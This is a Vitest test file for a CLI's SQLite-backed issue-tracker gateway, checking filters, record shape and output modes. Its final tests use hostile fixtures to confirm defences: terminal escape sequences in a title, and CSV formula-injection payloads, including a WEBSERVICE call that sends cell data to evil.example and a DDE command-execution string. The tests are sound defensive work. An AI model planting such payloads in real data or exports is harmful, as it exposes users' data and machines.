// @vitest-environment node
/**
 * DirectGateway unit tests against a real on-disk SQLite fixture built with the
 * actual tracker_items DDL (generated columns + JSON `data`), so list filters,
 * where-ops, status shorthand, relative-time and the JSON record shape are
 * exercised exactly as they'll behave against a live Nimbalyst DB.
 */
import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
import Database from 'better-sqlite3';
import { openDatabase } from '../../db/openDatabase.js';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { DirectGateway } from '../DirectGateway.js';
import { main } from '../../index.js';

const WORKSPACE = '/tmp/fixture-workspace';
let dbPath: string;

// Mirror of the relevant part of 0001_initial.sql (tracker_items + companions).
const SCHEMA = `
CREATE TABLE _migrations (version INTEGER PRIMARY KEY, name TEXT NOT NULL, applied_at TEXT);
CREATE TABLE tracker_items (
  id TEXT PRIMARY KEY,
  issue_number INTEGER,
  issue_key TEXT,
  local_key TEXT,
  type TEXT NOT NULL,
  data TEXT NOT NULL,
  workspace TEXT NOT NULL,
  document_path TEXT,
  line_number INTEGER,
  content TEXT,
  archived INTEGER NOT NULL DEFAULT 0,
  archived_at TEXT,
  source TEXT DEFAULT 'inline',
  source_ref TEXT,
  type_tags TEXT NOT NULL DEFAULT '[]',
  sync_status TEXT DEFAULT 'local',
  sync_id INTEGER,
  body_version INTEGER NOT NULL DEFAULT 0,
  deleted_at TEXT,
  created TEXT NOT NULL,
  updated TEXT NOT NULL,
  last_indexed TEXT NOT NULL DEFAULT '',
  title TEXT GENERATED ALWAYS AS (json_extract(data, '$.title')) STORED,
  status TEXT GENERATED ALWAYS AS (json_extract(data, '$.status')) STORED,
  kanban_sort_order TEXT GENERATED ALWAYS AS (json_extract(data, '$.kanbanSortOrder')) STORED
);
CREATE TABLE tracker_body_cache (
  item_id TEXT NOT NULL, body_version INTEGER NOT NULL, content TEXT NOT NULL,
  cached_at TEXT, PRIMARY KEY (item_id, body_version)
);
CREATE TABLE tracker_type_defs (
  id TEXT PRIMARY KEY,
  workspace TEXT NOT NULL,
  type TEXT NOT NULL,
  model TEXT NOT NULL,
  deleted_at TEXT,
  updated TEXT NOT NULL
);
`;

function insert(db: Database.Database, row: {
  id: string; type: string; data: Record<string, unknown>;
  issueKey?: string; localKey?: string; typeTags?: string[]; archived?: number;
  updated: string; created?: string; workspace?: string;
  origin?: unknown; bodyVersion?: number;
}): void {
  const data: Record<string, unknown> = { ...row.data };
  if (row.origin) (data as any).origin = row.origin;
  db.prepare(
    `INSERT INTO tracker_items (id, issue_key, local_key, type, data, workspace, type_tags, archived, body_version, created, updated)
     VALUES (@id, @issueKey, @localKey, @type, @data, @workspace, @typeTags, @archived, @bodyVersion, @created, @updated)`,
  ).run({
    id: row.id,
    issueKey: row.issueKey ?? null,
    localKey: row.localKey ?? null,
    type: row.type,
    data: JSON.stringify(data),
    workspace: row.workspace ?? WORKSPACE,
    typeTags: JSON.stringify(row.typeTags ?? [row.type]),
    archived: row.archived ?? 0,
    bodyVersion: row.bodyVersion ?? 0,
    created: row.created ?? row.updated,
    updated: row.updated,
  });
}

/** Runs the real CLI, capturing both streams the way a terminal would see them. */
async function captureCli(argv: string[]): Promise<{ out: string; err: string }> {
  const out: string[] = [];
  const err: string[] = [];
  const capture = (sink: string[]) => ((chunk: unknown) => {
    sink.push(String(chunk));
    return true;
  }) as any;
  const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(capture(out));
  const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(capture(err));
  try {
    expect(await main(argv)).toBe(0);
  } finally {
    stdout.mockRestore();
    stderr.mockRestore();
  }
  return { out: out.join(''), err: err.join('') };
}

beforeAll(() => {
  dbPath = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'nim-cli-')), 'nimbalyst.sqlite');
  const db = openDatabase(dbPath);
  db.exec(SCHEMA);
  db.prepare('INSERT INTO _migrations (version, name, applied_at) VALUES (?,?,?)').run(11, 'fixture', 'now');

  const now = new Date();
  const iso = (daysAgo: number) => new Date(now.getTime() - daysAgo * 86400000).toISOString();

  insert(db, { id: 'b1', issueKey: 'BUG-1', type: 'bug', updated: iso(0),
    data: { title: 'Login times out', status: 'to-do', priority: 'high', owner: 'greg', severity: 'critical', tags: ['auth', 'regression'] } });
  insert(db, { id: 'b2', issueKey: 'BUG-2', type: 'bug', updated: iso(5),
    data: { title: 'Crash on export', status: 'done', priority: 'low', owner: 'sam', severity: 'minor', tags: ['export'] } });
  insert(db, { id: 't1', issueKey: 'TASK-1', type: 'task', updated: iso(2),
    data: { title: 'Write docs', status: 'in-progress', priority: 'medium', owner: 'greg' } });
  insert(db, { id: 'b3', issueKey: 'BUG-3', type: 'bug', updated: iso(1), archived: 1,
    data: { title: 'Archived bug', status: 'to-do', priority: 'high' } });
  insert(db, { id: 'g1', issueKey: 'BUG-9', type: 'bug', updated: iso(0), bodyVersion: 1,
    data: { title: 'Imported issue', status: 'to-do' },
    origin: { external: { urn: 'github://acme/app#42' } } });
  db.prepare('INSERT INTO tracker_body_cache (item_id, body_version, content) VALUES (?,?,?)')
    .run('g1', 1, '# Repro\nSteps here');

  db.close();
});

afterAll(() => {
  try { fs.rmSync(path.dirname(dbPath), { recursive: true, force: true }); } catch { /* ignore */ }
});

describe('DirectGateway reads', () => {
  it('lists by type and excludes archived by default', async () => {
    const gw = new DirectGateway(dbPath);
    const items = await gw.listTrackers({ workspace: WORKSPACE, type: 'bug' });
    const keys = items.map((i) => i.issueKey).sort();
    // BUG-3 is archived -> excluded; BUG-1, BUG-2, BUG-9 remain.
    expect(keys).toEqual(['BUG-1', 'BUG-2', 'BUG-9']);
    gw.close();
  });

  it('resolves the open/closed status shorthand', async () => {
    const gw = new DirectGateway(dbPath);
    const open = await gw.listTrackers({ workspace: WORKSPACE, type: 'bug', status: 'open' });
    const closed = await gw.listTrackers({ workspace: WORKSPACE, type: 'bug', status: 'closed' });
    expect(open.map((i) => i.issueKey).sort()).toEqual(['BUG-1', 'BUG-9']);
    expect(closed.map((i) => i.issueKey)).toEqual(['BUG-2']); // status 'done' is terminal
    gw.close();
  });

  it('filters with where-ops (=, ~, in)', async () => {
    const gw = new DirectGateway(dbPath);
    const critical = await gw.listTrackers({ workspace: WORKSPACE, where: [{ field: 'severity', op: '=', value: 'critical' }] });
    expect(critical.map((i) => i.issueKey)).toEqual(['BUG-1']);

    const auth = await gw.listTrackers({ workspace: WORKSPACE, where: [{ field: 'tags', op: '~', value: 'auth' }] });
    expect(auth.map((i) => i.issueKey)).toEqual(['BUG-1']);

    const byPriority = await gw.listTrackers({ workspace: WORKSPACE, where: [{ field: 'priority', op: 'in', value: 'high,medium' }] });
    expect(byPriority.map((i) => i.issueKey).sort()).toEqual(['BUG-1', 'TASK-1']);
    gw.close();
  });

  it('applies --since relative-time on updated', async () => {
    const gw = new DirectGateway(dbPath);
    const since = new Date(Date.now() - 3 * 86400000).toISOString();
    const recent = await gw.listTrackers({ workspace: WORKSPACE, since });
    // Updated within 3 days: BUG-1 (0d), BUG-9 (0d), TASK-1 (2d). BUG-2 is 5d.
    expect(recent.map((i) => i.issueKey).sort()).toEqual(['BUG-1', 'BUG-9', 'TASK-1']);
    gw.close();
  });

  it('gets by issue key and by id with canonical record shape', async () => {
    const gw = new DirectGateway(dbPath);
    const byKey = await gw.getTracker(WORKSPACE, 'BUG-1');
    expect(byKey?.id).toBe('b1');
    expect(byKey?.primaryType).toBe('bug');
    expect(byKey?.fields.title).toBe('Login times out');
    expect(byKey?.fields.severity).toBe('critical'); // custom field preserved
    expect(byKey?.system.workspace).toBe(WORKSPACE);
    gw.close();
  });

  it('keeps system metadata out of custom fields in records and JSON output', async () => {
    const workspace = '/tmp/system-key-workspace';
    const db = openDatabase(dbPath);
    insert(db, {
      id: 'system-keys',
      issueKey: 'BUG-4841',
      type: 'bug',
      workspace,
      updated: new Date().toISOString(),
      data: {
        title: 'System-key classification',
        severity: 'high',
        linkedPullRequests: [{ remote: 'nimbalyst/nimbalyst', number: 42 }],
        linkedIssues: [{ remote: 'nimbalyst/nimbalyst', number: 41 }],
        triagedAt: '2026-08-31T13:00:00.000Z',
        triagedBy: { email: 'reviewer@example.com', displayName: 'Reviewer' },
        derivedSignals: [{ kind: 'stale-input-must-not-be-a-field' }],
      },
    });
    db.close();

    const gateway = new DirectGateway(dbPath);
    const record = await gateway.getTracker(workspace, 'BUG-4841');
    gateway.close();
    expect(record?.fields).toEqual({ title: 'System-key classification', severity: 'high' });
    expect(record?.system).toMatchObject({
      linkedPullRequests: [{ remote: 'nimbalyst/nimbalyst', number: 42 }],
      linkedIssues: [{ remote: 'nimbalyst/nimbalyst', number: 41 }],
      triagedAt: '2026-08-31T13:00:00.000Z',
      triagedBy: { email: 'reviewer@example.com', displayName: 'Reviewer' },
    });

    const rendered = JSON.parse((await captureCli([
      'tracker', 'show', 'BUG-4841', '--db', dbPath, '--workspace', workspace, '--json',
    ])).out);
    expect(rendered.fields).toEqual({ title: 'System-key classification', severity: 'high' });
  });

  it('resolves by URN and reads the body cache', async () => {
    const gw = new DirectGateway(dbPath);
    const rec = await gw.getTrackerByUrn(WORKSPACE, 'github://acme/app#42');
    expect(rec?.issueKey).toBe('BUG-9');
    const body = await gw.getTrackerBody(WORKSPACE, rec!);
    expect(body).toContain('# Repro');
    gw.close();
  });

  it('lists types present with counts', async () => {
    const gw = new DirectGateway(dbPath);
    const types = await gw.listTypes(WORKSPACE);
    const bug = types.find((t) => t.type === 'bug');
    expect(bug?.count).toBe(4); // includes the archived one
    gw.close();
  });

  it('runs the ready command over a full personal corpus before filtering', async () => {
    const type = 'phase6-personal';
    const workspace = '/tmp/phase6-personal-workspace';
    const db = openDatabase(dbPath);
    db.prepare(
      `INSERT INTO tracker_type_defs (id, workspace, type, model, updated)
       VALUES (?, ?, ?, ?, ?)`,
    ).run(
      `${workspace}::${type}`,
      workspace,
      type,
      JSON.stringify({
        type,
        roles: { title: 'title', workflowStatus: 'status' },
        fields: [
          {
            name: 'status',
            type: 'select',
            default: 'to-do',
            options: [
              { value: 'to-do', category: 'unstarted' },
              { value: 'in-progress', category: 'started' },
              { value: 'done', category: 'done' },
            ],
          },
          { name: 'dependsOn', type: 'relationship', relationshipTypeKey: 'depends-on' },
          { name: 'blocks', type: 'relationship', relationshipTypeKey: 'blocks' },
        ],
      }),
      new Date().toISOString(),
    );

    const updated = new Date().toISOString();
    insert(db, {
      id: 'phase6-closed-blocker',
      localKey: 'NIM.75',
      type,
      updated,
      workspace,
      data: { title: 'Closed blocker', status: 'done' },
    });
    insert(db, {
      id: 'phase6-ready-dependent',
      localKey: 'NIM.76',
      type,
      updated,
      workspace,
      data: {
        title: 'Ready after closed blocker',
        status: 'to-do',
        dependsOn: [{ itemId: 'phase6-closed-blocker' }],
      },
    });
    insert(db, {
      id: 'phase6-open-blocker',
      localKey: 'NIM.77',
      type,
      updated,
      workspace,
      data: { title: 'Open blocker', status: 'in-progress' },
    });
    insert(db, {
      id: 'phase6-blocked-dependent',
      localKey: 'NIM.78',
      type,
      updated,
      workspace,
      data: {
        title: 'Still blocked',
        status: 'to-do',
        dependsOn: [{ itemId: 'phase6-open-blocker' }],
      },
    });
    db.close();

    const writes: string[] = [];
    const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(((chunk: unknown) => {
      writes.push(String(chunk));
      return true;
    }) as any);
    try {
      const code = await main([
        'tracker',
        'ready',
        '--db',
        dbPath,
        '--workspace',
        workspace,
        '--type',
        type,
        '--json',
      ]);
      expect(code).toBe(0);
    } finally {
      stdout.mockRestore();
    }

    const output = JSON.parse(writes.join(''));
    expect(output.items.map((item: any) => item.localKey).sort()).toEqual([
      'NIM.76',
      'NIM.77',
    ]);
    expect(output.items.every((item: any) => item.issueKeyStatus === 'local')).toBe(true);
    expect(output.items.every((item: any) => item.issueKey === undefined)).toBe(true);
  });

  it('carries the machine-private caveat through -q, --csv and the table, once and only when earned', async () => {
    // `-q` and `--csv` returned before the table's footnote, so a dotted number
    // -- which resolves to nothing, or to a different item, on anyone else's
    // machine -- left the CLI with nothing saying it is unshareable. --json was
    // already correct, which is why it was the only mode covered above.
    const type = 'ref-caveat';
    const personal = '/tmp/ref-caveat-personal';
    const shared = '/tmp/ref-caveat-shared';
    const db = openDatabase(dbPath);
    const model = JSON.stringify({
      type,
      roles: { title: 'title', workflowStatus: 'status' },
      fields: [
        {
          name: 'status',
          type: 'select',
          default: 'to-do',
          options: [
            { value: 'to-do', category: 'unstarted' },
            { value: 'done', category: 'done' },
          ],
        },
      ],
    });
    const updated = new Date().toISOString();
    for (const workspace of [personal, shared]) {
      db.prepare(
        `INSERT INTO tracker_type_defs (id, workspace, type, model, updated)
         VALUES (?, ?, ?, ?, ?)`,
      ).run(`${workspace}::${type}`, workspace, type, model, updated);
    }
    insert(db, { id: 'caveat-local-1', localKey: 'NIM.75', type, updated, workspace: personal,
      data: { title: 'Private one', status: 'to-do' } });
    insert(db, { id: 'caveat-local-2', localKey: 'NIM.76', type, updated, workspace: personal,
      data: { title: 'Private two', status: 'to-do' } });
    insert(db, { id: 'caveat-shared-1', issueKey: 'NIM-75', type, updated, workspace: shared,
      data: { title: 'Shared one', status: 'to-do' } });
    db.close();

    const run = async (workspace: string, mode: string[]): Promise<{ out: string; err: string }> => {
      const out: string[] = [];
      const err: string[] = [];
      const capture = (sink: string[]) => ((chunk: unknown) => {
        sink.push(String(chunk));
        return true;
      }) as any;
      const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(capture(out));
      const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(capture(err));
      try {
        const code = await main([
          'tracker', 'ready', '--db', dbPath, '--workspace', workspace, '--type', type, ...mode,
        ]);
        expect(code).toBe(0);
      } finally {
        stdout.mockRestore();
        stderr.mockRestore();
      }
      return { out: out.join(''), err: err.join('') };
    };

    const CAVEAT = 'private to this project on this machine';
    const times = (text: string): number => text.split(CAVEAT).length - 1;

    // Quiet is a pipe. stdout stays exactly the refs a downstream command reads;
    // the sentence goes to stderr, where it costs that consumer nothing.
    const quiet = await run(personal, ['-q']);
    expect(quiet.out.trim().split('\n').sort()).toEqual(['NIM.75', 'NIM.76']);
    expect(times(quiet.err)).toBe(1);

    // CSV outlives its terminal, so the marker also travels in the data.
    const csv = await run(personal, ['--csv']);
    const csvLines = csv.out.trim().split('\n');
    expect(csvLines[0]).toBe('key,keyStatus,type,status,title,updated');
    expect(csvLines.slice(1).every((line) => /^NIM\.\d+,local,/.test(line))).toBe(true);
    expect(times(csv.out)).toBe(0);
    expect(times(csv.err)).toBe(1);

    // The table already footnotes on stdout and must not now say it twice.
    const table = await run(personal, []);
    expect(times(table.out)).toBe(1);
    expect(times(table.err)).toBe(0);

    // A fully-shared corpus has nothing to caveat, in any mode.
    for (const mode of [['-q'], ['--csv'], []]) {
      const sharedRun = await run(shared, mode);
      expect(times(sharedRun.out + sharedRun.err)).toBe(0);
    }
    expect((await run(shared, ['--csv'])).out.trim().split('\n')[0])
      .toBe('key,type,status,title,updated');
  });

  it('renders a title carrying terminal control sequences without them reaching the terminal', async () => {
    // Anyone who can create an item in a shared tracker writes its title, and
    // `ESC [ 2 J` in one clears the screen of whoever runs `nim tracker list`.
    const ESC = String.fromCharCode(0x1b);
    const BEL = String.fromCharCode(0x07);
    const hostile = `${ESC}[2J${ESC}]0;spoofed${BEL}Cleared${BEL} 日本語 — Ünïcöde`;
    const type = 'ctrl-fixture';
    const workspace = '/tmp/ctrl-fixture-workspace';
    const db = openDatabase(dbPath);
    insert(db, { id: 'ctrl-1', issueKey: 'SEC-1', type, workspace,
      updated: new Date().toISOString(), data: { title: hostile, status: 'to-do' } });
    db.close();

    const cli = (mode: string[]) =>
      captureCli(['tracker', 'list', '--db', dbPath, '--workspace', workspace, '--type', type, ...mode]);

    const table = await cli([]);
    expect(table.out).not.toContain(BEL);
    expect(table.out).not.toContain('[2J'); // the whole sequence goes, not just its ESC
    expect(table.out).not.toContain('spoofed'); // including an OSC's payload
    // Non-ASCII is not the attack and must survive byte for byte.
    expect(table.out).toContain('Cleared 日本語 — Ünïcöde');

    // JSON is consumed programmatically and already escapes control characters;
    // escaping twice would corrupt it, so that path stays untouched.
    const json = JSON.parse((await cli(['--json'])).out);
    expect(json.items[0].fields.title).toBe(hostile);

    // Quiet still emits the bare ref and nothing else.
    expect((await cli(['-q'])).out).toBe('SEC-1\n');
  });

  it('neutralizes csv formula cells without mangling ordinary numbers', async () => {
    // A cell opening with = + - @ is executed when the export is opened, as the
    // person who opened it.
    const type = 'csv-fixture';
    const workspace = '/tmp/csv-fixture-workspace';
    const payload = '=WEBSERVICE("https://evil.example/?x="&A1)';
    const db = openDatabase(dbPath);
    const updated = new Date().toISOString();
    insert(db, { id: 'csv-1', issueKey: 'SEC-2', type, workspace, updated,
      data: { title: payload, status: 'to-do' } });
    insert(db, { id: 'csv-2', issueKey: 'SEC-3', type, workspace, updated,
      data: { title: '-3', status: 'to-do' } });
    insert(db, { id: 'csv-3', issueKey: 'SEC-4', type, workspace, updated,
      data: { title: "-2+3+cmd|' /C calc'!A0", status: 'to-do' } });
    db.close();

    const csv = await captureCli([
      'tracker', 'list', '--db', dbPath, '--workspace', workspace, '--type', type, '--csv',
    ]);
    const lines = csv.out.trim().split('\n');
    expect(lines[0]).toBe('key,type,status,title,updated');
    const line = (key: string): string => lines.find((l) => l.startsWith(key))!;

    // Prefixed and force-quoted, so every spreadsheet reads it back as text.
    expect(line('SEC-2')).toContain(`"'=WEBSERVICE(`);
    // A whole-number cell is exempt: -3 stays the number -3.
    expect(line('SEC-3')).toContain(',-3,');
    // The exemption is narrow enough that the DDE payload is still caught.
    expect(line('SEC-4')).toContain(`"'-2+3+cmd`);
    // No cell anywhere is left starting with a formula character.
    expect(lines.some((l) => /(^|,)[=@]/.test(l))).toBe(false);
  });
});
